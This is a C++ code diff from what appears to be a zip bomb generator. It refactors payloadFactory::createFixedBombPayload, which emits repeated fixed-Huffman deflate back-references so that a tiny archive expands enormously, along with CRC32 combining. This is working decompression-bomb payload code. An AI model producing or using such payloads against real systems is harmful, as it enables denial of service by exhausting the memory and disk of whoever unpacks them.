@@ -7,6 +7,7 @@
 #include "zip_file_construction/LocalFileHeader.h"
 #include <chrono>
 #include <iostream>
+#include <thread>
 
 DeflateResult payloadFactory::createFixedBombPayload(const size_t size) {
     const auto start{std::chrono::steady_clock::now()};
@@ -19,22 +20,26 @@ DeflateResult payloadFactory::createFixedBombPayload(const size_t size) {
     writer.add(code, length);
 
     constexpr int bytesToCopy{256};
-    
+
     const MatchCode lengthCode{lz77::getLengthCode(bytesToCopy)};
     const MatchCode distanceCode{lz77::getDistanceCode(1)};
 
+    auto [lCode, lLength]{HuffmanTable::fixedSymbolTable(lengthCode.symbol)};
+    auto [dCode, dLength]{HuffmanTable::fixedDistanceTable(distanceCode.symbol)};
+
+    // replace as stream
     for (size_t i{}; i < 4 * size; ++i) {
-        auto [lCode, lLength]{HuffmanTable::fixedSymbolTable(lengthCode.symbol)};
+
         writer.add(lCode, lLength);
         writer.add(lengthCode.extraValue, lengthCode.extraBit);
 
-        auto [dCode, dLength]{HuffmanTable::fixedDistanceTable(distanceCode.symbol)};
         writer.add(dCode, dLength);
         writer.add(distanceCode.extraValue, distanceCode.extraBit);
     }
 
     auto [endCode, endLength]{HuffmanTable::fixedSymbolTable(256)};
     writer.add(endCode, endLength);
+
     const size_t repeatedData{4 * size * bytesToCopy};
 
     const size_t uncompressedSize{repeatedData + 1};
@@ -46,6 +51,7 @@ DeflateResult payloadFactory::createFixedBombPayload(const size_t size) {
     block.computeCrc32();
 
     size_t remaining{uncompressedSize};
+
     while (remaining) {
         if (remaining & 1) {
             BombCrc32.combine(block);
@@ -54,7 +60,7 @@ DeflateResult payloadFactory::createFixedBombPayload(const size_t size) {
         block.combine(block);
         remaining >>= 1;
     }
-    
+
     const auto end{std::chrono::steady_clock::now()};
     const auto elapsed{std::chrono::duration_cast<std::chrono::milliseconds>(end - start)};
 
